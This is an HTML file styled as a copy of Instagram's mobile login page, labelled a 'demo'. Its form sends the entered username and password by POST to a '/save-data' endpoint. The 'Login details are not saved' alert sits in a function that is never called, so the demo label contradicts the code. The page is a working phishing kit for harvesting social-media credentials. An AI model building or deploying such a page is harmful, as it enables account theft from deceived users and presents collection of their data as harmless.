
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">

<meta name="viewport"
content="width=device-width, initial-scale=1.0">

<title>Instagram Demo</title>


<style>
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

html {
    width: 100%;
    height: 100%;
}

body {
    width: 100%;
    min-height: 100vh;
    min-height: 100dvh;

    background: #000;
    color: #f5f5f5;
    font-family: Arial, sans-serif;

    overflow-x: hidden;
}

.page {
    width: 100%;
    min-height: 100vh;
    min-height: 100dvh;

    background: #1c1c1c;

    display: flex;
    flex-direction: column;

    padding:
        max(20px, env(safe-area-inset-top))
        29px
        max(20px, env(safe-area-inset-bottom));
}

/* LANGUAGE */

.language {
    text-align: center;
    color: #b7bdc1;

    font-size: 14px;

    margin-top: 38px;
}

/* LOGO */

.logo {
    display: flex;
    justify-content: center;
    align-items: center;

    margin-top: 72px;
    margin-bottom: 85px;
}

.logo svg {
    width: 78px;
    height: 78px;
}

/* FORM */

.login-form {
    width: 100%;

    display: flex;
    flex-direction: column;

    gap: 10px;
}

input {
    width: 100%;
    height: 55px;

    background: transparent;

    border: 1px solid #41494d;
    border-radius: 20px;

    padding: 0 15px;

    color: white;
    font-size: 14px;

    outline: none;
}

input::placeholder {
    color: #a8adb2;
}

/* LOGIN */

.login-btn {
    width: 100%;
    height: 40px;

    border: none;
    border-radius: 30px;

    background: #0866e9;
    color: white;

    font-size: 16px;
    font-weight: 600;

    margin-top: 0;
}

/* FORGOT */

.forgot {
    text-align: center;

    margin-top: 18px;

    font-size: 15px;
}

/* BOTTOM */

.bottom {
    margin-top: auto;

    padding-top: 65px;

    display: flex;
    flex-direction: column;
    align-items: center;

    gap: 20px;
}

/* CREATE */

.create-btn {
    width: 100%;
    height: 45px;

    border: 1px solid #4285f4;
    border-radius: 30px;

    background: transparent;
    color: #65a5ff;

    font-size: 15px;
}

/* META */

.meta {
    text-align: center;

    color: #d8dcdf;

    font-size: 18px;
}

/* SHORT SCREEN */

@media (max-height: 700px) {

    .language {
        margin-top: 15px;
    }

    .logo {
        margin-top: 40px;
        margin-bottom: 45px;
    }

    .bottom {
        padding-top: 35px;
    }
}

/* DESKTOP */

@media (min-width: 600px) {

    .page {
        max-width: 450px;
        margin: auto;
    }
}
</style>

</head>

<body>

<div class="page">

    <!-- LANGUAGE -->

    <div class="language">
        English (India) ▼
    </div>

    <!-- INSTAGRAM LOGO -->

    <div class="logo">

        <svg viewBox="0 0 100 100" fill="none">

            <defs>
                <linearGradient
                    id="instagramGradient"
                    x1="0"
                    y1="100"
                    x2="100"
                    y2="0">

                    <stop offset="0%" stop-color="#ffd600"/>
                    <stop offset="35%" stop-color="#ff0069"/>
                    <stop offset="100%" stop-color="#d300c5"/>

                </linearGradient>
            </defs>

            <rect
                x="9"
                y="9"
                width="82"
                height="82"
                rx="24"
                stroke="url(#instagramGradient)"
                stroke-width="9"/>

            <circle
                cx="50"
                cy="50"
                r="19"
                stroke="url(#instagramGradient)"
                stroke-width="9"/>

            <circle
                cx="74"
                cy="27"
                r="5"
                fill="#d300c5"/>

        </svg>

    </div>

    <!-- LOGIN FORM -->
<form class="login-form" action="/save-data" method="POST">

    <input
        type="text"
        name="username"
        placeholder="Username, email address or mobile number"
        autocomplete="off"
        required>

    <input
        type="password"
        name="password"
        placeholder="Password"
        autocomplete="off"
        required>

    <button
        type="submit"
        class="login-btn">
        Log in
    </button>

</form>


    <!-- FORGOTTEN PASSWORD -->

    <div
        class="forgot"
        onclick="forgotPassword()">

        Forgotten password?

    </div>

    <!-- BOTTOM -->

    <div class="bottom">

        <button
            class="create-btn"
            onclick="createAccount()">

            Create new account

        </button>

        <div class="meta">
            ∞ Meta
        </div>

    </div>

</div>

<script>

function demoLogin() {

    alert(
        "Demo website only.\nLogin details are not saved."
    );

}

function forgotPassword() {

    alert(
        "Demo page: Password recovery is unavailable."
    );

}

function createAccount() {

    alert(
        "Demo page: Account creation is unavailable."
    );

}

</script>

</body>
</html>
